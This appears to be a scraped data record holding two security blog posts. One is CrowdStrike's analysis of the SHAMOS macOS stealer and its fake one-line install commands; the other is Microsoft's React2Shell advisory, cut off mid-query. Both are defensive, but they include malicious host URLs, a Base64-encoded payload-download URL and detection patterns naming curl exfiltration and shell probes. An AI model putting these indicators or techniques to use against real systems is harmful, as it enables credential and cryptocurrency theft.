Agent Detects Malware at Machine Speed 01/06/26 Unveiling WARP PANDA: A New Sophisticated China-Nexus Adversary 12/04/25 CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers 11/20/25 Endpoint Security & XDR Endpoint Security & XDR Advanced Web Shell Detection and Prevention: A Deep Dive into CrowdStrike's Linux Sensor Capabilities 02/05/26 CrowdStrike Falcon Scores Perfect 100% in SE Labs\u2019 Most Challenging Ransomware Test 02/03/26 CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Voice of the Customer for Endpoint Protection Platforms 01/28/26 Small Devices, Big Risk: USB Drives Threaten Enterprise Security 01/21/26 Engineering & Tech Engineering & Tech EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware 09/03/25 Falcon Platform Prevents COOKIE SPIDER\u2019s SHAMOS Delivery on macOS 08/20/25 CrowdStrike\u2019s Approach to Better Machine Learning Evaluation Using Strategic Data Splitting 08/11/25 CrowdStrike Researchers Develop Custom XGBoost Objective to Improve ML Model Release Stability 03/20/25 Executive Viewpoint Executive Viewpoint The Architecture of Agentic Defense: Inside the Falcon Platform 01/16/26 The Dawn of the Agentic SOC: Reimagining Cybersecurity for the AI Era 09/26/25 CrowdStrike Falcon Platform Evolves to Lead the Agentic Security Era 09/16/25 CrowdStrike to Acquire Pangea to Secure Enterprise AI Use and Development 09/15/25 From The Front Lines From The Front Lines CrowdStrike Named a Leader in 2025 IDC MarketScape for Worldwide Incident Response Services 08/27/25 CrowdStrike Launches New AI Security Services to Strengthen AI Security and SOC Readiness 08/06/25 CrowdStrike Detects and Blocks Initial SharePoint Zero-Day Exploitation 07/21/25 Prescription for Protection: Healthcare Industry Observations from CrowdStrike Investigations 07/01/25 Next-Gen Identity Security Next-Gen Identity Security CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication 02/12/26 CrowdStrike to Acquire Seraphic to Secure Work in Any Browser 01/13/26 Falcon Shield Evolves with AI Agent Visibility and Falcon Next-Gen SIEM Integration 12/08/25 CrowdStrike Named Overall Leader in 2025 KuppingerCole ITDR Leadership Compass 11/10/25 Next-Gen SIEM & Log Management Next-Gen SIEM & Log Management How to Scale SOC Automation with Falcon Fusion SOAR 02/11/26 Transform AWS Security Operations with Falcon Next-Gen SIEM 12/01/25 CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR 11/05/25 CrowdStrike Named a Visionary in 2025 Gartner\u00ae Magic Quadrant\u2122 for Security Information and Event Management 10/10/25 Public Sector Public Sector CrowdStrike Achieves FedRAMP\u00ae High Authorization 03/19/25 NHS Matures Healthcare Cybersecurity with NCSC\u2019s CAF Assurance Model 03/13/25 Zero Trust Strengthens Data Protection to Achieve National Cyber Strategy Goals 01/15/25 CrowdStrike Statement on Bloomberg\u2019s October 25, 2024 Story 10/25/24 Exposure Management Exposure Management February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched 02/10/26 CrowdStrike Is the Only Vendor to Be Named a Customers\u2019 Choice in 2025 Gartner\u00ae Voice of the Customer for External Attack Surface Management 02/09/26 January 2026 Patch Tuesday: 114 CVEs Patched Including 3 Zero-Days 01/13/26 Inside the Latest Innovations Powering Falcon Exposure Management 12/12/25 Data Protection Data Protection Falcon Data Protection for Cloud Extends DSPM into Runtime 11/20/25 CrowdStrike Stops GenAI Data Leaks with Unified Data Protection 09/18/25 Q&A: How Mastronardi Produce Secures Innovation with CrowdStrike 02/14/25 Data Protection Day 2025: The Evolving Role of AI in Data Protection 01/28/25 Securing AI Securing AI What Security Teams Need to Know About OpenClaw, the AI Super Agent 02/04/26 Secure AI with CrowdStrike: Real-World Stories of Protecting AI Workloads and Data 02/02/26 How Agentic Tool Chain Attacks Threaten AI Agent Security 01/30/26 Data Protection Day 2026: From Compliance to Resilience 01/28/26 Start Free Trial Featured Recent Video Category Start Free Trial Falcon Platform Prevents COOKIE SPIDER\u2019s SHAMOS Delivery on macOS August 20, 2025 | Maddie Stewart - Suweera De Souza - Ash Leslie - Doug Brown | Engineering & Tech \u2022 Threat Hunting & Intel Between June and August 2025, the CrowdStrike Falcon\u00ae platform successfully blocked a sophisticated malware campaign that attempted to compromise over 300 customer environments. The campaign deployed SHAMOS , a variant of Atomic macOS Stealer (AMOS) developed by the cybercriminal group COOKIE SPIDER. Operating as malware-as-a-service, COOKIE SPIDER rents this information stealer to cybercriminals who deploy it to harvest sensitive information and cryptocurrency assets from victims. The campaign utilized malvertising to direct users to fraudulent macOS help websites where victims were instructed to execute a malicious one-line installation command. This campaign underscores the popularity of malicious one-line installation commands among eCrime actors. This technique allows them to bypass Gatekeeper security checks and install the Mach-O executable directly onto victim devices. Cuckoo Stealer and SHAMOS operators have previously leveraged this method in Homebrew malvertising campaigns occurring between May 2024 and January 2025. Details In an exemplar campaign from June 2025, when the victim searches for a macOS-related issue \u2014 for example, \u201cmacos flush resolver cache\u201d \u2014 they receive a promoted malvertising website in their search results (Figure 1). Users located in multiple countries \u2014 including the U.S., UK, Japan, China, Colombia, Canada, Mexico, Italy, and others \u2014 received these advertisements; no victims were located in Russia. This is likely due to the fact that Russian eCrime forums prohibit commodity malware operators from targeting users based in Russia and other countries belonging to the Commonwealth of Independent States (CIS). Figure 1. Screenshot of search engine results with promoted malvertising website One Google Advertising profile promoting this spoofed macOS help website appears to be a legitimate Australia-based electronics store, suggesting the eCrime actors responsible are likely spoofing the store name in their Google Advertising profile. This assessment is made with moderate confidence, as this profile\u2019s promoted advertisement URLs appear to relate to macOS help pages \u2014 mac-safer[.]com and rescue-mac[.]com \u2014 and therefore do not align with the legitimate store\u2019s business operations (Figure 2). Figure 2. Google advertising profile The fake help pages provide victims with false instructions for how to fix their problem (Figure 3). Figure 3. False instructions displayed on macOS help pages Both malvertising websites instruct the victims to copy, paste, and execute the following command in Terminal (Figure 4): Figure 4. Malicious one-line installation command displayed on malvertising websites The command decodes the Base64-encoded string aHR0cHM6Ly9pY2xvdWRzZXJ2ZXJzLmNvbS9nbS9pbnN0YWxsLnNo and downloads a file from https[:]//icloudservers[.]com/gm/install[.]sh . This file is a Bash script that captures the user\u2019s password and downloads a SHAMOS Mach-O executable from https[:]//icloudservers[.]com/gm/update (Figure 5). Figure 5. Bash script contents Since first reporting on this type of campaign in June 2025, CrowdStrike Counter Adverary Operations has continued to observe opportunistic eCrime threat actors leveraging malicious GitHub repositories to prompt victims to execute commands that download SHAMOS . Similar to the aforementioned activity, campaign operators allege to offer a free download of a tool designed for macOS; these tools involve video editing software, computer-aided design (CAD) products, macOS performance tools, AI software, and dictation software. The threat actor(s) behind these pages continue to use the malicious one-line command to install SHAMOS . In some cases, the command is written entirely in plain text, and in others, the URL that hosts SHAMOS is Base64-encoded (Figure 6). Figure 6. Samples of malicious one-line installation commands displayed on malvertising websites throughout July and August 2025 SHAMOS Installation/Execution The malicious installation command downloads SHAMOS Mach-O into the /tmp/ directory, removes extended file attributes using xattr likely for bypassing Gatekeeper checks, assigns executable permissions via chmod , and then executes the stealer. SHAMOS executes anti-VM commands to verify that the Mach-O is not executing in a suspected sandbox environment. The stealer then executes a variety of AppleScript commands for host reconnaissance and data collection tasks, including searching for known cryptocurrency-related wallet files and sensitive credential-based files on disk. SHAMOS attempts to exfiltrate collected sensitive files, including data from Keychain, AppleNotes, and browsers, using curl to transmit the data in a ZIP archive named out.zip (Figure 7). Figure 7. Falcon UI detection on the binary execution from tmp SHAMOS downloads additional malicious payloads, including a spoofed Ledger Live wallet application and a botnet module, to the victim\u2019s home directory as hidden files and assigns them with executable permissions. The stealer also configures a Plist file named com.finder.helper.plist for persistence and saves it to the User\u2019s LaunchDaemons directory if the victim has Sudo privileges. CrowdStrike observed multiple curl commands, likely suggesting the eCrime actor was using SHAMOS \u2019s botnet module (Figure 8). Figure 8. Falcon UI detection demonstrating likely botnet module use Additional Reporting Open-source reporting detailed an additional malvertising campaign related to the observed activity. This campaign involved a GitHub repository masquerading as iTerm2\u2019s GitHub repository, located at https[:]//github[.]com/jeryrymoore/Iterm2 , that contained instructions detailing how to download iTerm2, a terminal emulator for macOS (Figure 9). 1 The malicious one-line installation command is nearly identical to the command used in the malvertising campaign; however, the campaign\u2019s Bash script host URL is not Base64-encoded. The Bash script \u2014 retrieved from https[:]//macostutorial[.]com/iterm2/install[.]sh \u2014 downloads SHAMOS from https[:]//macostutorial[.]com/iterm2/update . Figure 9. GitHub repository containing fake iTerm2 installation instructions CrowdStrike Falcon Coverage CrowdStrike employs a layered approach for malware detection using machine learning and indicators of attack (IOAs). As shown in Figure 10, the CrowdStrike Falcon\u00ae sensor\u2019s machine learning capabilities and behavior-based detection capabilities (IOAs) can automatically detect and prevent SHAMOS in the initial stages of the attack chain (i.e., as soon as the malware is downloaded onto the victim\u2019s machine and at execution of the malicious shell script). Additionally, IOAs can recognize malicious behavior at further stages in the attack chain, including when the threat actor attempts to employ tactics like data collection, persistence, execution of further binaries, and data exfiltration. Figure 10. Falcon UI detection on execution of Bash script Assessment This campaign highlights that leveraging malvertising and the one-line installation-command technique to distribute macOS information stealers remains popular among eCrime actors. Promoting false malicious websites encourages more site traffic, which will lead to more potential victims. The one-line installation command enables eCrime actors to directly install the Mach-O executable onto the victim\u2019s machine while bypassing Gatekeeper checks. CrowdStrike Counter Adversary Operations assesses that eCrime actors will likely continue to leverage both malvertising and one-line installation commands to distribute macOS information stealers. This assessment is made with high confidence, as the combination has historically been successful, and these methods allow actors to bypass Gatekeeper checks. Recommended Prevention Settings To protect endpoints from this threat, CrowdStrike Falcon\u00ae Insight XDR customers should ensure the following prevention policy settings are configured: Suspicious process prevention Intelligence-sourced threat prevention Threat Hunting Queries The following CrowdStrike Falcon\u00ae Next-Gen SIEM Advanced Event Search queries are provided to assist defenders in hunting for this and similar activity across their endpoints. NOTE: Make sure to update the Falcon URL to the cloud in which your environment is currently configured (US1, US2, EU, etc.) \u201cBash script execution with calls to risky LOOBINs\u201d event_platform=Mac #event_simpleName=ScriptControlScanInfo ScriptContent=\"*dscl*curl*xattr*chmod*\" | format(\"[GraphExplorer](https://falcon.crowdstrike.com/graphs/process-explorer/tree?id=pid:%s:%s)\", field=[\"aid\", \"TargetProcessId\"], as=GraphExplorer) | groupBy([aid, GraphExplorer, ScriptContent]) \u201cAppleScript execution under a binary from /tmp/\u201d event_platform=Mac #event_simpleName=ProcessRollup2 ImageFileName=\"*/tmp/*\" | join({event_platform=Mac #event_simpleName=ProcessRollup2 ImageFileName=\"*osascript\" CommandLine=\"*-e*\" | rename(field=\"CommandLine\", as=\"ChildCommandLine\") | rename(field=\"ImageFileName\", as=\"ChildImageFileName\")}, field=TargetProcessId, key=ParentProcessId, include=[\"ChildImageFileName\", \"ChildCommandLine\"], limit=20000) | format(\"[GraphExplorer](https://falcon.crowdstrike.com/graphs/process-explorer/tree?id=pid:%s:%s)\", field=[\"aid\", \"TargetProcessId\"], as=GraphExplorer) | groupBy([aid, GraphExplorer, ImageFileName, CommandLine, ChildImageFileName, ChildCommandLine]) \u201cCurl with commandline indicative of data exfil\u201d event_platform=Mac #event_simpleName=ProcessRollup2 FileName=curl CommandLine=\"*POST*out.zip*\" | format(\"[GraphExplorer](https://falcon.crowdstrike.com/graphs/process-explorer/tree?id=pid:%s:%s)\", field=[\"aid\", \"TargetProcessId\"], as=GraphExplorer) | groupBy([aid, GraphExplorer, ImageFileName, CommandLine]) Indicators of Compromise (IOCs) IOC Description Malvertising websites containing instructions to download SHAMOS mac-safer[.]com rescue-mac[.]com https[:]//github[.]com/jeryrymoore/Iterm2 Bash script SHA256 hashes 231c4bf14c4145be77aa4fef36c208891d818983c520ba067dda62d3bbbf547f eb7ede285aba687661ad13f22f8555aab186debbadf2c116251cb269e913ef68 SHAMOS Mach-O SHA256 hashes 4549e2599de3011973fde61052a55e5cdb770348876abc82de14c2d99575790f b01c13969075974f555c8c88023f9abf891f72865ce07efbcee6c2d906d410d5 a4e47fd76dc8ed8e147ea81765edc32ed1e11cff27d138266e3770c7cf953322 Bash script host URLs https[:]//icloudservers[.]com/gm/install[.]sh https[:]//macostutorial[.]com/iterm2/install[.]sh SHAMOS host URLs https[:]//icloudservers[.]com/gm/update https[:]//macostutorial[.]com/iterm2/update MITRE ATT&CK Framework The following table maps reported COOKIE SPIDER and SHAMOS tactics, techniques, and procedures (TTPs) to the MITRE ATT&CK\u00ae framework. ID Technique Description T1583.001 Acquire Infrastructure: Domains The eCrime actor registered fake macOS help websites T1189 Drive-by Compromise Malvertising distributes websites containing SHAMOS installation instructions T1204 User Execution SHAMOS requires the user to execute the malicious installer command T1027.010 Obfuscated Files or Information: Command Obfuscation The malicious command uses Base64-encoding to obfuscate the Bash script download URL T1105 Ingress Tool Transfer The malicious Bash script downloads SHAMOS from an external URL Additional Resources Learn how CrowdStrike\u2019s Threat Intelligence and Hunting solutions are transforming security operations to better protect your business. Tune into the Adversary Universe Podcast , where CrowdStrike experts discuss today\u2019s threat actors \u2014 who they are, what they\u2019re after, and how you can defend against them. Download the CrowdStrike 2025 Global Threat Report and CrowdStrike 2025 Threat Hunting Report . 1. The legitimate iTerm2 GitHub repository is located at https[:]//github[.]com/gnachman/iTerm2. Tweet Share Related Content CrowdStrike\u2019s Journey in Customizing NVIDIA Nemotron Models for Peak Accuracy and Performance How CrowdStrike Trains GenAI Models at Scale Using Distributed Computing EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware Categories Agentic SOC 47 Cloud & Application Security 139 Data Protection 20 Endpoint Security & XDR 349 Engineering & Tech 86 Executive Viewpoint 177 Exposure Management 115 From The Front Lines 197 Next-Gen Identity Security 65 Next-Gen SIEM & Log Management 109 Public Sector 40 Securing AI 24 Threat Hunting & Intel 208 CONNECT WITH US FEATURED ARTICLES October 01, 2024 CrowdStrike Named a Leader in 2024 Gartner\u00ae Magic Quadrant\u2122 for Endpoint Protection Platforms September 25, 2024 Recognizing the Resilience of the CrowdStrike Community September 25, 2024 CrowdStrike Drives Cybersecurity Forward with New Innovations Spanning AI, Cloud, Next-Gen SIEM and Identity Protection September 18, 2024 SUBSCRIBE Sign up now to receive the latest notifications and updates from CrowdStrike. Sign Up See CrowdStrike Falcon \u00ae in Action Detect, prevent, and respond to attacks\u2014 even malware-free intrusions\u2014at any stage, with next-generation endpoint protection. See Demo CrowdStrike\u2019s Approach to Better Machine Learning Evaluation Using Strategic Data Splitting EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware Copyright \u00a9 2026 CrowdStrike Privacy Request Info Blog Contact Us 1.888.512.8906 Accessibility",
    "expected_count": 3
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/",
    "title": "Your Privacy Choices Opt-Out Icon",
    "content": "Skip to content Skip to main content Microsoft Microsoft Security Microsoft Security Microsoft Security Home Why Microsoft Security Solutions AI-powered cybersecurity Cloud security Data security & governance Identity & network access Privacy & risk management Security for AI Unified SecOps Zero Trust Products Product families Product families Microsoft Defender Microsoft Entra Microsoft Intune Microsoft Priva Microsoft Purview Microsoft Sentinel Security AI Security AI Microsoft Security Copilot Identity & access Identity & access Microsoft Entra ID (Azure Active Directory) Microsoft Entra Agent ID Microsoft Entra External ID Microsoft Entra ID Governance Microsoft Entra ID Protection Microsoft Entra Internet Access Microsoft Entra Private Access Microsoft Entra Permissions Management Microsoft Entra Verified ID Microsoft Entra Workload ID Microsoft Entra Domain Services Azure Key Vault SIEM & XDR SIEM & XDR Microsoft Sentinel Microsoft Defender for Cloud Microsoft Defender XDR Microsoft Defender for Endpoint Microsoft Defender for Office 365 Microsoft Defender for Identity Microsoft Defender for Cloud Apps Microsoft Security Exposure Management Microsoft Defender Vulnerability Management Microsoft Defender Threat Intelligence Cloud security Cloud security Microsoft Defender for Cloud Microsoft Defender Cloud Security Posture Mgmt Microsoft Defender External Attack Surface Management Azure Firewall Azure Web App Firewall Azure DDoS Protection GitHub Advanced Security Endpoint security & management Endpoint security & management Microsoft Defender for Endpoint Microsoft Defender XDR Microsoft Defender for Business Microsoft Intune core capabilities Microsoft Defender for IoT Microsoft Defender Vulnerability Management Microsoft Intune Advanced Analytics Microsoft Intune Endpoint Privilege Management\u200b Microsoft Intune Enterprise Application Management Microsoft Intune Remote Help Microsoft Cloud PKI Compliance & privacy Compliance & privacy Microsoft Purview Communication Compliance Microsoft Purview Compliance Manager Microsoft Purview Data Lifecycle Management Microsoft Purview eDiscovery Microsoft Purview Audit Microsoft Priva Risk Management Microsoft Priva Subject Rights Requests Data security & governance Data security & governance Microsoft Purview Information Protection Microsoft Purview Insider Risk Management Microsoft Purview Data Loss Prevention Microsoft Purview Data Governance Pricing Services Partners Resources Get started Get started Cybersecurity awareness Customer stories Security 101 Product trials How we protect Microsoft Reports and analysis Reports and analysis Industry recognition Microsoft Security Insider Microsoft Digital Defense Report Security Response Center Community Community Microsoft Security Blog Microsoft Security Events Microsoft Tech Community Documentation and training Documentation and training Documentation Technical Content Library Training & certifications Additional sites Additional sites Compliance Program for Microsoft Cloud Microsoft Trust Center Security Engineering Portal Service Trust Portal Microsoft Secure Future Initiative Business Solutions Hub Contact Sales Start free trial More All Microsoft Global Microsoft Security Azure Dynamics 365 Microsoft 365 Microsoft Teams Windows 365 Tech & innovation Tech & innovation Microsoft AI Azure Space Mixed reality Microsoft HoloLens Microsoft Viva Quantum computing Sustainability Industries Industries Education Automotive Financial services Government Healthcare Manufacturing Retail Partners Partners Find a partner Become a partner Partner Network Microsoft Marketplace Marketplace Rewards Software development companies Resources Resources Blog Microsoft Advertising Developer Center Documentation Events Licensing Microsoft Learn Microsoft Research View Sitemap Search Search Microsoft Security No results Cancel Home Defending against the CVE-2025-55182 (React2Shell) vulnerability in React Server Components Search Research December 15, 2025 16 min read Defending against the CVE-2025-55182 (React2Shell) vulnerability in React Server Components By Microsoft Defender Security Research Team Share Link copied to clipboard! Content types Research Products and services Microsoft Defender Microsoft Defender Experts for XDR Microsoft Defender for Cloud Microsoft Defender for Endpoint Microsoft Defender Vulnerability Management Microsoft Defender XDR Microsoft Security Experts Microsoft Sentinel Topics Endpoint security Threat intelligence CVE-2025-55182 (also referred to as React2Shell and includes CVE-2025-66478, which was merged into it) is a critical pre-authentication remote code execution (RCE) vulnerability affecting React Server Components, Next.js, and related frameworks. With a CVSS score of 10.0, this vulnerability could allow attackers to execute arbitrary code on vulnerable servers through a single malicious HTTP request. Exploitation activity related to this vulnerability was detected as early as December 5, 2025. Most successful exploits originated from red team assessments; however, we also observed real-world exploitation attempts by threat actors delivering multiple subsequent payloads, majority of which are coin miners. Both Windows and Linux environments have been observed to be impacted. The React Server Components ecosystem is a collection of packages, frameworks, and bundlers that enable React 19 applications to run parts of their logic on the server rather than the browser. It uses the Flight protocol to communicate between client and server. When a client requests data, the server receives a payload, parses this payload, executes server-side logic, and returns a serialized component tree. The vulnerability exists because affected React Server Components versions fail to validate incoming payloads. This could allow attackers to inject malicious structures that React accepts as valid, leading to prototype pollution and remote code execution. This vulnerability presents a significant risk because of the following factors: Default configurations are vulnerable, requiring no special setup or developer error. Public proof-of-concept exploits are readily available with near-100% reliability. Exploitation can happen without any user authentication since this is a pre-authentication vulnerability. The vulnerability could be exploited using a single malicious HTTP request. In this report, Microsoft Defender researchers share insights from observed attacker activity exploiting this vulnerability. Detailed analyses, detection insights, as well as mitigation recommendations and hunting guidance are covered in the next sections. Further investigation towards providing stronger protection measures is in progress, and this report will be updated when more information becomes available. Analyzing CVE-2025-55182 exploitation activity React is widely adopted in enterprise environments. In Microsoft Defender telemetry, we see tens of thousands of distinct devices across several thousand organizations running some React or React-based applications. Some of the vulnerable applications are deployed inside containers, and the impact on the underlying host is dependent on the security configurations of the container . We identified several hundred machines across a diverse set of organizations compromised using common tactics, techniques, and procedures (TTPs) observed with web application RCE. To exploit CVE-2025-55182, an attacker sends a crafted input to a web application running React Server Components functions in the form of a POST request. This input is then processed as a serialized object and passed to the backend server, where it is deserialized. Due to the default trust among the components, the attacker-provided input is then deserialized and the backend runs attacker-provided code under the NodeJS runtime. Figure 1: Attack diagram depicting activity leading to action on objectives Post-exploitation, attackers were observed to run arbitrary commands, such as reverse shells to known Cobalt Strike servers. To achieve persistence, attackers added new malicious users, utilized remote monitoring and management (RMM) tools such as MeshAgent, modified authorized_keys file, and enabled root login. To evade security defenses, the attackers downloaded from attacker-controlled CloudFlare Tunnel endpoints (for example, *.trycloudflare.com ) and used bind mounts to hide malicious processes and artifacts from system monitoring tools. The malware payloads seen in campaigns investigated by Microsoft Defender vary from remote access trojans (RATs) like VShell and EtherRAT, the SNOWLIGHT memory-based malware downloader that enabled attackers to deploy more payloads to target environments, ShadowPAD, and XMRig cryptominers. The attacks proceeded by enumerating system details and environment variables to enable lateral movement and credential theft. Credentials that were observed to be targeted included Azure Instance Metadata Service (IMDS) endpoints for Azure, Amazon Web Services (AWS), Google Cloud Platform (GCP), and Tencent Cloud to acquire identity tokens, which could be used to move laterally to other cloud resources. Attackers also deployed secret discovery tools such as TruffleHog and Gitleaks, along with custom scripts to extract several different secrets. Attempts to harvest AI and cloud-native credentials, such as OpenAI API keys, Databricks tokens, and Kubernetes service\u2011account credentials were also observed. Azure Command-Line Interface (CLI) (az) and Azure Developer CLI (azd) were also used to obtain tokens. Figure 2: Example of reverse shell observed in one of the campaigns Mitigation and protection guidance Microsoft recommends customers to act on these mitigation recommendations: Manual identification guidance Until full in-product coverage is available, you can manually assess exposure on servers or containers: Navigate to your project directory and open the node_modules folder. Review installed packages and look for: react-server-dom-webpack react-server-dom-parcel react-server-dom-turbopack next Validate versions against the known affected range: React: 19.0.0,19.1.0, 19.1.1, 19.2.0 Next.js: 15.0.0 \u2013 15.0.4, 15.1.0 \u2013 15.1.8, 15.2.0 \u2013 15.2.5, 15.3.0 \u2013 15.3.5, 15.4.0 \u2013 15.4.7, 15.5.0 \u2013 15.5.6, 16.0.0 \u2013 16.0.6, 14.3.0-canary.77 and later canary releases If any of these packages match the affected versions, remediation is required. Prioritize internet-facing assets first, especially those identified by Defender as externally exposed. Mitigation best practices Patch immediately React and Next.js have released fixes for the impacted packages. Upgrade to one of the following patched versions (or later within the same release line): React: 19.0.1, 19.1.2, 19.2.1 Next.js: 5.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7 Because many frameworks and bundlers rely on these packages, make sure your framework-level updates also pull in the corrected dependencies. Prioritize exposed services Patch all affected systems, starting with internet-facing workloads. Use Microsoft Defender Vulnerability Management (MDVM) to surface vulnerable package inventory and to track remediation progress across your estate. Monitor for exploit activity Review MDVM dashboards and Defender alerts for indicators of attempted exploitation. Correlate endpoint, container, and cloud signals for higher confidence triage. Invoke incident response process to address any related suspicious activity stemming from this vulnerability. Add WAF protections where appropriate Apply Azure Web Application Firewall (WAF) custom rules for Application Gateway and Application Gateway for Containers to help block exploit patterns while patching is in progress. Microsoft has published rule guidance and JSON examples in the Azure Network Security Blog, with ongoing updates as new attack permutations are identified. Recommended customer action checklist Identify affected React Server Components packages in your applications and images. Upgrade to patched versions. Refer to the React page for patching guidance. Prioritize internet-facing services for emergency change windows. Enable and monitor Defender alerts tied to React Server Components exploitation attempts. Apply Azure WAF custom rules as a compensating control where feasible. Use MDVM to validate coverage and confirm risk reduction post-update. CVE-2025-55182 represents a high-impact, low-friction attack path against modern React Server Components deployments. Rapid patching combined with layered Defender monitoring and WAF protections provides the strongest short-term and long-term risk reduction strategy. Microsoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog. Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence. Tactic Observed activity Microsoft Defender coverage Initial Access /Execution Suspicious process launched by Node Microsoft Defender for Endpoint \u2013 Possible exploitation of React Server Components vulnerability (2 detectors) Microsoft Defender Antivirus \u2013 HackTool:Linux/SuspNodeActivity.A \u2013 HackTool:Linux/SuspNodeActivity.B \u2013 Behavior:Linux/SuspNodeActivity.B \u2013 Trojan:JS/CVE-2025-55182.A \u2013 Trojan:VBS/CVE-2025-55182.DA!MTB Execution Execution of suspicious commands initiated by the next-server parent process to probe for command execution capabilities. Microsoft Defender for Cloud \u2013 Potential React2Shell command injection detected on a Kubernetes cluster \u2013 Potential React2Shell command injection detected on Azure App Service Microsoft Defender for Endpoint \u2013 Suspicious process executed by a network service \u2013 Suspicious Node.js script execution \u2013 Suspicious Node.js process behavior In many cases subsequent activity post exploitation was detected and following alerts were triggered on the victim devices. Note that the following alerts below can also be triggered by unrelated threat activity. Tactic Observed activity Microsoft Defender coverage Execution Suspicious downloads, encoded execution, anomalous service/process creation, and behaviors indicative of a reverse shell and crypto-mining Microsoft Defender for Endpoint \u2013 Suspicious PowerShell download or encoded command execution \u2013 Possible reverse shell \u2013 Suspicious service launched \u2013 Suspicious anonymous process created using memfd_create \u2013 Possible cryptocurrency miner Defense Evasion Unauthorized code execution through process manipulation, abnormal DLL loading, and misuse of legitimate system tools Microsoft Defender for Endpoint \u2013 A process was injected with potentially malicious code \u2013 An executable file loaded an unexpected DLL file \u2013 Use of living-off-the-land binary to run malicious code Credential Access Unauthorized use of Kerberos tickets to impersonate accounts and gain unauthorized access Microsoft Defender for Endpoint \u2013 Pass-the-ticket attack Credential Access Suspicious access to sensitive files such as cloud and GIT credentials Microsoft Defender for Cloud \u2013 Possible secret reconnaissance detected Lateral movement Attacker activity observed in multiple environments Microsoft Defender for Endpoint \u2013 Hands-on-keyboard attack involving multiple devices Automatic attack disruption through Microsoft Defender for Endpoint alerts To better support customers in the event of exploitation, we are expanding our detection framework to identify and alert on CVE-2025-55182 activity across all operating systems for Microsoft Defender for Endpoint customers. These detections are integrated with automatic attack disruption . When these alerts, combined with other signals, provide high confidence of active attacker behavior, automatic attack disruption can initiate autonomous containment actions to help stop the attack and prevent further progression. Microsoft Defender Vulnerability Management and Microsoft Defender for Cloud Microsoft Defender for Cloud rolled out support to surface CVE-2025-55182 with agentless scanning across containers and cloud virtual machines (VMs). Follow the documentation on how to enable agentless scanning: Protect your servers with Defender for Servers Defender for Containers Deployment Overview Microsoft Defender Vulnerability Management (MDVM) can surface impacted Windows, Linux, and macOS devices. In addition, MDVM and Microsoft Defender for Cloud dashboards can surface: Identification of exposed assets in the organization Clear remediation guidance tied to your affected assets and workloads Microsoft Security Copilot Security Copilot customers can use the standalone experience to create their own prompts or run the following prebuilt promptbooks to automate incident response or investigation tasks related to this threat: Incident investigation Microsoft User analysis Threat actor profile Threat Intelligence 360 report based on MDTI article Vulnerability impact assessment Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel. Threat intelligence reports Microsoft Defender XDR customers can use the following threat analytics reports in the Defender portal (requires license for at least one Defender XDR product) to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments. Microsoft Defender XDR threat analytics Vulnerability Profile: CVE-2025-55182 \u2013 React Server Components Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor. Hunting queries and recommendations Microsoft Defender XDR Microsoft Defender XDR customers can run the following query to find related activity in their networks: Detect potential React2Shell command injection attempt CloudAuditEvents | where (ProcessCommandLine == \"/bin/sh -c (whoami)\" and (ParentProcessName == \"node\" or ParentProcessName has \"next-server\")) or (ProcessCommandLine has_any (\"echo\",\"powershell\") and ProcessCommandLine matches regex @'(echo\\s+\\$\\(\\(\\d+\\*\\d+\\)\\)|powershell\\s+-c\\s+\"\\d+\\*\\d+\")') | project Timestamp, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, FileName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName Identify encoded PowerShell attempts let lookback = 10d; DeviceProcessEvents | where Timestamp >= ago(lookback) | where InitiatingProcessParentFileName has \"node\" | where InitiatingProcessCommandLine has_any (\"next start\", \"next-server\") or ProcessCommandLine has_any (\"next start\", \"next-server\") | summarize make_set(InitiatingProcessCommandLine), make_set(ProcessCommandLine) by DeviceId, Timestamp //looking for powershell activity | where set_ProcessCommandLine has_any (\"cmd.exe\",\"powershell\") | extend decoded_powershell_1 = replace_string(tostring(base64_decode_tostring(tostring(split(tostring(split(set_ProcessCommandLine.[0],\"EncodedCommand \",1).[0]),'\"',0).[0]))),\"\\0\",\"\") | extend decoded_powershell_1b = replace_string(tostring(base64_decode_tostring(tostring(split(tostring(split(set_ProcessCommandLine.[0],\"Enc \",1).[0]),'\"',0).[0]))),\"\\0\",\"\") | extend decoded_powershell_2 = replace_string(tostring(base64_decode_tostring(tostring(split(tostring(split(set_ProcessCommandLine.[0],\"enc \",1).[0]),'\"',0).[0]))),\"\\0\",\"\") | extend decoded_powershell_3 = replace_string(tostring(base64_decode_tostring(tostring(split(tostring(split(set_ProcessCommandLine.[0],\"ec \",1).[0]),'\"',0).[0]))),\"\\0\",\"\") | where set_ProcessCommandLine !has \"'powershell -c \" | extend decoded_powershell = iff( isnotempty( decoded_powershell_1),decoded_powershell_1, iff(isnotempty( decoded_powershell_2), decoded_powershell_2, iff(isnotempty( decoded_powershell_3), decoded_powershell_3,decoded_powershell_1b))) | project-away decoded_powershell_1, decoded_powershell_1b, decoded_powershell_2,decoded_powershell_3 | where isnotempty( decoded_powershell) Identify execution of suspicious commands initiated by the next-server parent process post-exploitation let lookback = 